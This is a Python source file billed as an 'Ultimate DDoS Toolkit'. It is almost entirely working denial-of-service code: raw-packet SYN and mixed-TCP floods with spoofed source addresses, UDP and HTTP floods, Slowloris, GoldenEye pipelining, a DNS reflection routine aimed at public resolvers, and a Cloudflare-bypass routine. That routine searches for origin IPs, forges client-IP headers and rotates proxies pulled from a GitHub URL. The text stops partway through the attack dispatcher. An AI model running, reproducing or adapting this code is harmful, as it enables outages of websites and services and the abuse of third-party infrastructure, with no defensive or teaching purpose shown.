# attack_methods.py - Ultimate DDoS Toolkit with GitHub Proxy Support
import socket
import random
import threading
import time
import struct
import ssl
import requests
from urllib.parse import urlparse
import urllib3
import cloudscraper
import dns.resolver

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Enhanced user agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.203",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

# Thread management
MAX_THREADS = 500  # Optimized for packet flooding
active_threads = threading.Semaphore(MAX_THREADS)

# Target resolution with caching
_target_cache = {}
_cache_lock = threading.Lock()

# Performance tracking
performance_stats = {
    "packets_sent": 0,
    "requests_sent": 0,
    "bandwidth_used": 0,
    "start_time": time.time()
}

# Configuration
OPTIMAL_CONFIG = {
    "syn_flood": {"threads": 5, "duration": 60},
    "udp_flood": {"threads": 4, "duration": 60, "packet_size": 1024},
    "http_flood": {"threads": 10, "duration": 60},
    "slowloris": {"sockets_count": 100, "duration": 300},
    "cloudflare_bypass": {"threads": 15, "duration": 60},
    "goldeneye": {"threads": 8, "duration": 60},
    "udp_amplification": {"threads": 3, "duration": 60},
    "tcp_mixed": {"threads": 6, "duration": 60},
}

# GitHub proxy list URL
PROXY_LIST_URL = "https://raw.githubusercontent.com/Adamits1/files/main/proxies.txt"

def fetch_proxies_from_github(url=PROXY_LIST_URL):
    """Fetch proxy list from GitHub"""
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            # Parse proxy list (one proxy per line in format ip:port)
            proxies = []
            for line in response.text.split('\n'):
                line = line.strip()
                if line and ':' in line and not line.startswith('#'):
                    proxies.append(line)
            print(f"Loaded {len(proxies)} proxies from GitHub")
            return proxies
        else:
            print(f"Failed to fetch proxies: HTTP {response.status_code}")
    except Exception as e:
        print(f"Error fetching proxies: {e}")
    
    return []

def resolve_target(target):
    """Resolve a target (URL or IP) to IP address and port with caching"""
    with _cache_lock:
        if target in _target_cache and time.time() - _target_cache[target]['timestamp'] < 300:
            return _target_cache[target]['ip'], _target_cache[target]['port']
    
    try:
        # If it's already an IP:port format
        if ":" in target and not target.startswith("http"):
            parts = target.split(":")
            if len(parts) == 2:
                ip = parts[0]
                port = int(parts[1])
                with _cache_lock:
                    _target_cache[target] = {'ip': ip, 'port': port, 'timestamp': time.time()}
                return ip, port
        
        # Parse URL if it starts with http/https
        if target.startswith("http"):
            parsed = urlparse(target)
            hostname = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            # Resolve hostname to IP
            ip = socket.gethostbyname(hostname)
            with _cache_lock:
                _target_cache[target] = {'ip': ip, 'port': port, 'timestamp': time.time()}
            return ip, port
        else:
            # Assume it's a domain without scheme
            hostname = target
            port = 80
            ip = socket.gethostbyname(hostname)
            with _cache_lock:
                _target_cache[target] = {'ip': ip, 'port': port, 'timestamp': time.time()}
            return ip, port
    except Exception as e:
        raise ValueError(f"Could not resolve target: {target} - {str(e)}")

def checksum(data):
    """Calculate checksum for packets"""
    if len(data) % 2 != 0:
        data += b'\0'
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i+1]
        s += w
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

def create_optimized_socket(protocol='udp'):
    """Create optimized sockets with appropriate buffers"""
    try:
        if protocol == 'tcp':
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Increase socket buffers
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024)  # 1MB buffer
        sock.settimeout(0)  # Non-blocking
        return sock
    except:
        return socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def generate_syn_packet(src_ip, dst_ip, src_port, dst_port):
    """Generate a raw SYN packet"""
    # IP header
    ip_ver = 4
    ip_ihl = 5
    ip_tos = 0
    ip_tot_len = 40  # IP + TCP headers
    ip_id = random.randint(1, 65535)
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0
    ip_saddr = socket.inet_aton(src_ip)
    ip_daddr = socket.inet_aton(dst_ip)
    
    ip_header = struct.pack('!BBHHHBBH4s4s', 
                          (ip_ver << 4) + ip_ihl,
                          ip_tos,
                          ip_tot_len,
                          ip_id,
                          ip_frag_off,
                          ip_ttl,
                          ip_proto,
                          ip_check,
                          ip_saddr,
                          ip_daddr)
    
    # TCP header
    tcp_source = src_port
    tcp_dest = dst_port
    tcp_seq = random.randint(0, 4294967295)
    tcp_ack_seq = 0
    tcp_doff = 5
    tcp_window = socket.htons(5840)
    tcp_check = 0
    tcp_urg_ptr = 0
    tcp_flags = 2  # SYN flag
    
    tcp_offset_res = (tcp_doff << 4)
    
    tcp_header = struct.pack('!HHLLBBHHH', 
                           tcp_source, tcp_dest,
                           tcp_seq, tcp_ack_seq,
                           tcp_offset_res, tcp_flags,
                           tcp_window, tcp_check, tcp_urg_ptr)
    
    # Pseudo header for checksum
    source_address = socket.inet_aton(src_ip)
    dest_address = socket.inet_aton(dst_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)
    
    psh = struct.pack('!4s4sBBH', 
                     source_address, 
                     dest_address, 
                     placeholder, 
                     protocol, 
                     tcp_length)
    psh = psh + tcp_header
    
    # Calculate checksum
    tcp_check = checksum(psh)
    
    # Repack with correct checksum
    tcp_header = struct.pack('!HHLLBBHHH', 
                           tcp_source, tcp_dest,
                           tcp_seq, tcp_ack_seq,
                           tcp_offset_res, tcp_flags,
                           tcp_window, tcp_check, tcp_urg_ptr)
    
    return ip_header + tcp_header

def attack_syn_flood(target, duration=60):
    """High-performance SYN flood using raw sockets"""
    ip, port = resolve_target(target)
    config = OPTIMAL_CONFIG["syn_flood"]
    threads = config["threads"]
    
    # Pre-generate packets for maximum performance
    packets = []
    for _ in range(1000):  # 1000 unique packets
        src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        src_port = random.randint(1024, 65535)
        packets.append(generate_syn_packet(src_ip, ip, src_port, port))
    
    end_time = time.time() + duration
    packets_sent = [0]
    active_threads = threading.Semaphore(threads)
    
    def flood_thread():
        with active_threads:
            sock = None
            try:
                # Try to create raw socket (requires admin/root)
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                except:
                    # Fallback to regular socket
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                while time.time() < end_time:
                    for _ in range(100):  # Send in batches
                        packet = random.choice(packets)
                        try:
                            sock.sendto(packet, (ip, 0))
                            packets_sent[0] += 1
                            performance_stats["packets_sent"] += 1
                            performance_stats["bandwidth_used"] += len(packet) * 8
                        except:
                            break
                    # Small delay to prevent complete network lock
                    time.sleep(0.001)
            except:
                pass
            finally:
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
    
    # Start controlled number of threads
    thread_pool = []
    for _ in range(threads):
        t = threading.Thread(target=flood_thread)
        t.daemon = True
        thread_pool.append(t)
        t.start()
    
    # Monitor and regulate to maintain WiFi functionality
    while time.time() < end_time:
        time.sleep(0.1)
    
    print(f"SYN Flood completed. Sent {packets_sent[0]} packets (~{packets_sent[0]*60/duration/1000:.1f} Kpps)")

def attack_udp_flood(target, duration=60):
    """High-performance UDP flood"""
    ip, port = resolve_target(target)
    config = OPTIMAL_CONFIG["udp_flood"]
    threads = config["threads"]
    packet_size = config["packet_size"]
    
    # Pre-generate random payloads
    payloads = [random._urandom(packet_size) for _ in range(100)]
    
    end_time = time.time() + duration
    packets_sent = [0]
    bandwidth_used = [0]
    active_threads = threading.Semaphore(threads)
    
    def flood_thread():
        with active_threads:
            sock = create_optimized_socket('udp')
            batch_size = 50  # Packets per batch
            
            while time.time() < end_time:
                try:
                    for _ in range(batch_size):
                        payload = random.choice(payloads)
                        sock.sendto(payload, (ip, port))
                        packets_sent[0] += 1
                        bandwidth_used[0] += len(payload) * 8
                        performance_stats["packets_sent"] += 1
                        performance_stats["bandwidth_used"] += len(payload) * 8
                    
                    # Adaptive sleeping to prevent WiFi disruption
                    current_bandwidth = bandwidth_used[0] / (time.time() - (end_time - duration))
                    if current_bandwidth > 800000000:  # 800 Mbps
                        time.sleep(0.005)  # Slow down if approaching limit
                    else:
                        time.sleep(0.001)
                except:
                    try:
                        sock.close()
                    except:
                        pass
                    sock = create_optimized_socket('udp')
    
    # Start threads
    thread_pool = []
    for _ in range(threads):
        t = threading.Thread(target=flood_thread)
        t.daemon = True
        thread_pool.append(t)
        t.start()
    
    # Monitor bandwidth usage
    start_time = time.time()
    while time.time() < end_time:
        elapsed = time.time() - start_time
        current_bw = bandwidth_used[0] / elapsed if elapsed > 0 else 0
        time.sleep(1)
    
    print(f"UDP Flood completed. Sent {packets_sent[0]} packets, {bandwidth_used[0]/1000000:.2f} Mbit total")

def attack_http_flood(target, duration=60):
    """Optimized HTTP flood"""
    ip, port = resolve_target(target)
    config = OPTIMAL_CONFIG["http_flood"]
    threads = config["threads"]
    
    use_ssl = port == 443
    protocol = "https://" if use_ssl else "http://"
    base_url = f"{protocol}{ip}:{port}"
    
    # Pre-generated request components
    paths = ["/", "/api", "/static", "/images", "/css", "/js", "/blog"]
    params = ["id", "page", "category", "search", "view", "sort"]
    user_agents = USER_AGENTS
    
    end_time = time.time() + duration
    requests_sent = [0]
    active_threads = threading.Semaphore(threads)
    
    def http_thread():
        with active_threads:
            # Create a session-like connection
            sock = None
            while time.time() < end_time:
                try:
                    if sock is None:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(5)
                        
                        if use_ssl:
                            context = ssl.create_default_context()
                            context.check_hostname = False
                            context.verify_mode = ssl.CERT_NONE
                            sock = context.wrap_socket(sock, server_hostname=ip)
                        
                        sock.connect((ip, port))
                    
                    # Build request
                    path = random.choice(paths)
                    param = random.choice(params)
                    value = random.randint(1, 10000)
                    url = f"{path}?{param}={value}" if random.random() > 0.3 else path
                    
                    headers = (
                        f"GET {url} HTTP/1.1\r\n"
                        f"Host: {ip}\r\n"
                        f"User-Agent: {random.choice(user_agents)}\r\n"
                        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        f"Accept-Language: en-US,en;q=0.5\r\n"
                        f"Connection: keep-alive\r\n"
                        f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
                        "\r\n"
                    )
                    
                    sock.send(headers.encode())
                    requests_sent[0] += 1
                    performance_stats["requests_sent"] += 1
                    performance_stats["bandwidth_used"] += len(headers) * 8
                    
                    # Try to read response briefly (non-blocking)
                    try:
                        sock.settimeout(0.1)
                        sock.recv(1024)
                    except:
                        pass
                    sock.settimeout(5)
                    
                    # Adaptive delay to prevent WiFi disruption
                    time.sleep(0.05)
                    
                except:
                    # Reconnect on error
                    if sock:
                        try:
                            sock.close()
                        except:
                            pass
                        sock = None
                    time.sleep(0.5)
    
    # Start threads
    thread_pool = []
    for _ in range(threads):
        t = threading.Thread(target=http_thread)
        t.daemon = True
        thread_pool.append(t)
        t.start()
    
    # Monitor progress
    while time.time() < end_time:
        time.sleep(1)
    
    print(f"HTTP Flood completed. Sent {requests_sent[0]} requests")

def attack_slowloris(target, duration=60):
    """Optimized Slowloris - connection exhaustion"""
    ip, port = resolve_target(target)
    config = OPTIMAL_CONFIG["slowloris"]
    sockets_count = config["sockets_count"]
    
    use_ssl = port == 443
    
    # Create and maintain connections
    sockets = []
    end_time = time.time() + duration
    
    # Create initial connections
    for i in range(min(sockets_count, 150)):  # Limit to prevent local issues
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=ip)
            
            sock.connect((ip, port))
            
            # Send partial headers
            sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {ip}\r\n".encode())
            sock.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode())
            sock.send("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".encode())
            
            sockets.append(sock)
            performance_stats["bandwidth_used"] += 200 * 8  # Estimate
        except:
            pass
    
    print(f"Established {len(sockets)} connections")
    
    # Maintain connections
    while time.time() < end_time and sockets:
        for sock in list(sockets):  # Use list to avoid modification during iteration
            try:
                # Send keep-alive headers periodically
                header = f"X-{random.randint(1000,9999)}: {random.randint(1, 5000)}\r\n"
                sock.send(header.encode())
                performance_stats["bandwidth_used"] += len(header) * 8
            except:
                sockets.remove(sock)
                try:
                    sock.close()
                except:
                    pass
                
        # Replenish closed connections
        while len(sockets) < sockets_count and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                
                if use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=ip)
                
                sock.connect((ip, port))
                
                # Send partial headers
                sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {ip}\r\n".encode())
                sock.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode())
                
                sockets.append(sock)
                performance_stats["bandwidth_used"] += 200 * 8  # Estimate
            except:
                break
        
        time.sleep(15)  # Send keep-alive every 15 seconds
    
    # Clean up
    for sock in sockets:
        try:
            sock.close()
        except:
            pass
    
    print(f"Slowloris completed. Maintained up to {sockets_count} connections")

def attack_cloudflare_bypass(target, duration=60):
    """Advanced Cloudflare bypass with custom proxies from GitHub"""
    config = OPTIMAL_CONFIG["cloudflare_bypass"]
    threads = config["threads"]
    
    # Try to find origin IP using multiple methods
    origin_ip = find_origin_ip(target)
    if origin_ip:
        print(f"Found origin IP: {origin_ip}, attacking directly")
        attack_http_flood(origin_ip, duration)
        return
    
    # If origin IP not found, use advanced bypass techniques
    ip, port = resolve_target(target)
    use_ssl = port == 443
    protocol = "https://" if use_ssl else "http://"
    base_url = f"{protocol}{ip}:{port}"
    
    # Fetch custom proxies from GitHub
    proxy_list = fetch_proxies_from_github()
    
    # Advanced bypass headers
    bypass_headers_list = [
        {
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "CF-Connecting-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "True-Client-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        },
        {
            "X-Originating-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Remote-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Remote-Addr": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Client-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        }
    ]
    
    # Common paths that might bypass CF
    bypass_paths = [
        "/cdn-cgi/login", "/cdn-cgi/challenge", "/cgi-bin/test", "/admin", "/wp-admin",
        "/phpmyadmin", "/mysql", "/db", "/database", "/api", "/internal", "/private"
    ]
    
    end_time = time.time() + duration
    requests_sent = [0]
    active_threads = threading.Semaphore(threads)
    
    def bypass_thread():
        with active_threads:
            session = requests.Session()
            session.verify = False
            scraper = cloudscraper.create_scraper()
            
            while time.time() < end_time:
                try:
                    # Rotate between different techniques
                    technique = random.randint(0, 4)
                    
                    if technique == 0:
                        # Method 1: Use cloudscraper to bypass challenges
                        headers = {
                            'User-Agent': random.choice(USER_AGENTS),
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Language': 'en-US,en;q=0.5',
                        }
                        headers.update(random.choice(bypass_headers_list))
                        
                        response = scraper.get(base_url + random.choice(bypass_paths), 
                                             headers=headers, timeout=5)
                        requests_sent[0] += 1
                        performance_stats["requests_sent"] += 1
                    
                    elif technique == 1:
                        # Method 2: Direct requests with bypass headers
                        headers = {
                            'User-Agent': random.choice(USER_AGENTS),
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        }
                        headers.update(random.choice(bypass_headers_list))
                        
                        response = session.get(base_url, headers=headers, timeout=5)
                        requests_sent[0] += 1
                        performance_stats["requests_sent"] += 1
                    
                    elif technique == 2:
                        # Method 3: POST requests with form data
                        headers = {
                            'User-Agent': random.choice(USER_AGENTS),
                            'Content-Type': 'application/x-www-form-urlencoded',
                        }
                        headers.update(random.choice(bypass_headers_list))
                        
                        data = {
                            'username': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)),
                            'password': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10)),
                            'redirect': base_url
                        }
                        
                        response = session.post(base_url + '/login', data=data, 
                                              headers=headers, timeout=5)
                        requests_sent[0] += 1
                        performance_stats["requests_sent"] += 1
                    
                    elif technique == 3 and proxy_list:
                        # Method 4: Use custom proxies from GitHub
                        proxy = random.choice(proxy_list)
                        
                        # Handle different proxy formats
                        if ':' in proxy and proxy.count(':') == 3:
                            # Proxy with authentication: ip:port:username:password
                            ip_part, port_part, username, password = proxy.split(':')
                            proxy_url = f"http://{username}:{password}@{ip_part}:{port_part}"
                        else:
                            # Proxy without authentication: ip:port
                            proxy_url = f"http://{proxy}"
                        
                        proxies = {
                            'http': proxy_url,
                            'https': proxy_url
                        }
                        
                        headers = {
                            'User-Agent': random.choice(USER_AGENTS),
                        }
                        
                        try:
                            response = session.get(base_url, headers=headers, 
                                                 proxies=proxies, timeout=5)
                            requests_sent[0] += 1
                            performance_stats["requests_sent"] += 1
                        except:
                            # Remove failed proxy from list
                            if proxy in proxy_list:
                                proxy_list.remove(proxy)
                    
                    else:
                        # Method 5: Use cloudscraper with random path
                        headers = {
                            'User-Agent': random.choice(USER_AGENTS),
                        }
                        
                        response = scraper.get(base_url + f"/{random.randint(1000,9999)}", 
                                             headers=headers, timeout=5)
                        requests_sent[0] += 1
                        performance_stats["requests_sent"] += 1
                    
                    time.sleep(0.1)
                    
                except:
                    time.sleep(0.5)
    
    # Start threads
    thread_pool = []
    for _ in range(threads):
        t = threading.Thread(target=bypass_thread)
        t.daemon = True
        thread_pool.append(t)
        t.start()
    
    # Monitor progress
    while time.time() < end_time:
        time.sleep(1)
    
    print(f"Cloudflare bypass completed. Sent {requests_sent[0]} requests")

def find_origin_ip(target):
    """Try to find the origin IP behind Cloudflare"""
    try:
        domain = target
        if target.startswith("http"):
            parsed = urlparse(target)
            domain = parsed.hostname
        
        # Method 1: Check historical DNS records
        try:
            resolver = dns.resolver.Resolver()
            answers = resolver.resolve(domain, 'A')
            for answer in answers:
                return str(answer)
        except:
            pass
        
        # Method 2: Check common subdomains
        subdomains = ['direct', 'origin', 'server', 'ip', 'ftp', 'mail', 'cpanel', 'webmail', 'ns1', 'ns2']
        for sub in subdomains:
            try:
                test_domain = f"{sub}.{domain}"
                ip = socket.gethostbyname(test_domain)
                # Check if it's not a Cloudflare IP
                if not is_cloudflare_ip(ip):
                    return ip
            except:
                pass
        
        # Method 3: Check domain history services (simulated)
        # In a real implementation, you would use APIs like SecurityTrails, etc.
        
    except:
        pass
    
    return None

def is_cloudflare_ip(ip):
    """Check if an IP belongs to Cloudflare"""
    # Cloudflare IP ranges (simplified)
    cloudflare_ranges = [
        "103.21.244.0/22",
        "103.22.200.0/22",
        "103.31.4.0/22",
        "104.16.0.0/13",
        "104.24.0.0/14",
        "108.162.192.0/18",
        "131.0.72.0/22",
        "141.101.64.0/18",
        "162.158.0.0/15",
        "172.64.0.0/13",
        "173.245.48.0/20",
        "188.114.96.0/20",
        "190.93.240.0/20",
        "197.234.240.0/22",
        "198.41.128.0/17"
    ]
    
    # Simple check (in a real implementation, use proper IP range checking)
    for ip_range in cloudflare_ranges:
        base_ip, mask = ip_range.split('/')
        if ip.startswith(base_ip[:-1]):  # Simplified check
            return True
    
    return False

def attack_udp_amplification(target, duration=60):
    """UDP amplification attack using DNS reflection"""
    ip, port = resolve_target(target)
    config = OPTIMAL_CONFIG["udp_amplification"]
    threads = config["threads"]
    
    # DNS query for isc.org (large response) - common amplification vector
    dns_query = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x03isc\x03org\x00\x00\xff\x00\x01\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00'
    
    # List of open DNS resolvers for amplification
    dns_resolvers = [
        "8.8.8.8", "8.8.4.4",  # Google DNS
        "1.1.1.1", "1.0.0.1",  # Cloudflare DNS
        "9.9.9.9",             # Quad9 DNS
        "64.6.64.6", "64.6.65.6",  # Verisign DNS
    ]
    
    end_time = time.time() + duration
    packets_sent = [0]
    active_threads = threading.Semaphore(threads)
    
    def amplification_thread():
        with active_threads:
            sock = create_optimized_socket('udp')
            
            while time.time() < end_time:
                try:
                    # Send to multiple DNS resolvers for amplification
                    for resolver in dns_resolvers:
                        # Spoof source IP to target (DNS reflection)
                        sock.sendto(dns_query, (resolver, 53))
                        packets_sent[0] += 1
                        performance_stats["packets_sent"] += 1
                    
                    # Also send direct UDP packets
                    sock.sendto(random._urandom(512), (ip, port))
                    packets_sent[0] += 1
                    performance_stats["packets_sent"] += 1
                    
                    time.sleep(0.01)
                except:
                    try:
                        sock.close()
                    except:
                        pass
                    sock = create_optimized_socket('udp')
    
    # Start threads
    thread_pool = []
    for _ in range(threads):
        t = threading.Thread(target=amplification_thread)
        t.daemon = True
        thread_pool.append(t)
        t.start()
    
    # Monitor progress
    while time.time() < end_time:
        time.sleep(1)
    
    print(f"UDP amplification completed. Sent {packets_sent[0]} packets")

def attack_goldeneye(target, duration=60):
    """GoldenEye attack with HTTP pipeline flooding"""
    ip, port = resolve_target(target)
    config = OPTIMAL_CONFIG["goldeneye"]
    threads = config["threads"]
    
    use_ssl = port == 443
    
    end_time = time.time() + duration
    requests_sent = [0]
    active_threads = threading.Semaphore(threads)
    
    def goldeneye_thread():
        with active_threads:
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    
                    if use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        sock = context.wrap_socket(sock, server_hostname=ip)
                    
                    sock.connect((ip, port))
                    
                    # Build a pipeline of requests
                    pipeline = ""
                    for i in range(random.randint(5, 15)):
                        path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3, 10)))
                        pipeline += f"GET {path} HTTP/1.1\r\n"
                        pipeline += f"Host: {ip}\r\n"
                        pipeline += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                        pipeline += "Connection: keep-alive\r\n"
                        pipeline += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
                        pipeline += "\r\n"
                    
                    # Send the pipelined requests
                    sock.send(pipeline.encode())
                    requests_count = pipeline.count("GET ")
                    requests_sent[0] += requests_count
                    performance_stats["requests_sent"] += requests_count
                    performance_stats["bandwidth_used"] += len(pipeline) * 8
                    
                    # Keep connection open for a bit
                    time.sleep(random.uniform(0.5, 2))
                    
                    sock.close()
                    
                except Exception as e:
                    try:
                        sock.close()
                    except:
                        pass
                    time.sleep(0.1)
    
    # Start threads
    thread_pool = []
    for _ in range(threads):
        t = threading.Thread(target=goldeneye_thread)
        t.daemon = True
        thread_pool.append(t)
        t.start()
    
    # Monitor progress
    while time.time() < end_time:
        time.sleep(1)
    
    print(f"GoldenEye attack completed. Sent {requests_sent[0]} requests")

def attack_tcp_mixed(target, duration=60):
    """Mixed TCP attack with various flags"""
    ip, port = resolve_target(target)
    config = OPTIMAL_CONFIG["tcp_mixed"]
    threads = config["threads"]
    
    end_time = time.time() + duration
    packets_sent = [0]
    active_threads = threading.Semaphore(threads)
    
    def mixed_flood_thread():
        with active_threads:
            while time.time() < end_time:
                try:
                    # Create a raw socket if possible
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                        use_raw = True
                    except:
                        use_raw = False
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                    
                    if use_raw:
                        # Craft TCP packet with various flags
                        source_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                        source_port = random.randint(1024, 65535)
                        
                        # Random TCP flags (SYN, ACK, RST, FIN, URG, PSH)
                        tcp_flags = random.choice([2, 16, 4, 1, 32, 8])
                        
                        # IP header
                        ip_ver = 4
                        ip_ihl = 5
                        ip_tos = 0
                        ip_tot_len = 40
                        ip_id = random.randint(1, 65535)
                        ip_frag_off = 0
                        ip_ttl = 255
                        ip_proto = socket.IPPROTO_TCP
                        ip_check = 0
                        ip_saddr = socket.inet_aton(source_ip)
                        ip_daddr = socket.inet_aton(ip)
                        
                        ip_header = struct.pack('!BBHHHBBH4s4s', 
                                              (ip_ver << 4) + ip_ihl,
                                              ip_tos,
                                              ip_tot_len,
                                              ip_id,
                                              ip_frag_off,
                                              ip_ttl,
                                              ip_proto,
                                              ip_check,
                                              ip_saddr,
                                              ip_daddr)
                        
                        # TCP header
                        tcp_source = source_port
                        tcp_dest = port
                        tcp_seq = random.randint(0, 4294967295)
                        tcp_ack_seq = 0
                        tcp_doff = 5
                        tcp_window = socket.htons(5840)
                        tcp_check = 0
                        tcp_urg_ptr = 0
                        
                        tcp_offset_res = (tcp_doff << 4)
                        
                        tcp_header = struct.pack('!HHLLBBHHH', 
                                               tcp_source, tcp_dest,
                                               tcp_seq, tcp_ack_seq,
                                               tcp_offset_res, tcp_flags,
                                               tcp_window, tcp_check, tcp_urg_ptr)
                        
                        # Pseudo header for checksum
                        source_address = socket.inet_aton(source_ip)
                        dest_address = socket.inet_aton(ip)
                        placeholder = 0
                        protocol = socket.IPPROTO_TCP
                        tcp_length = len(tcp_header)
                        
                        psh = struct.pack('!4s4sBBH', 
                                         source_address, 
                                         dest_address, 
                                         placeholder, 
                                         protocol, 
                                         tcp_length)
                        psh = psh + tcp_header
                        
                        # Calculate checksum
                        tcp_check = checksum(psh)
                        
                        # Repack with correct checksum
                        tcp_header = struct.pack('!HHLLBBHHH', 
                                               tcp_source, tcp_dest,
                                               tcp_seq, tcp_ack_seq,
                                               tcp_offset_res, tcp_flags,
                                               tcp_window, tcp_check, tcp_urg_ptr)
                        
                        # Send packet
                        packet = ip_header + tcp_header
                        sock.sendto(packet, (ip, 0))
                        packets_sent[0] += 1
                        performance_stats["packets_sent"] += 1
                    else:
                        # Fallback to regular socket method
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(1)
                        try:
                            s.connect((ip, port))
                            # Random action
                            action = random.randint(0, 2)
                            if action == 0:
                                s.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
                                time.sleep(0.1)
                            elif action == 1:
                                s.close()
                            else:
                                time.sleep(2)
                            s.close()
                        except:
                            pass
                        
                    # Small delay
                    time.sleep(0.01)
                except Exception as e:
                    time.sleep(0.01)
    
    # Start threads
    thread_pool = []
    for _ in range(threads):
        t = threading.Thread(target=mixed_flood_thread)
        t.daemon = True
        thread_pool.append(t)
        t.start()
    
    # Monitor progress
    while time.time() < end_time:
        time.sleep(1)
    
    print(f"TCP mixed attack completed. Sent {packets_sent[0]} packets")

# Attack dispatcher with all methods
ATTACK_METHODS = {
    "syn_flood": attack_syn_flood,
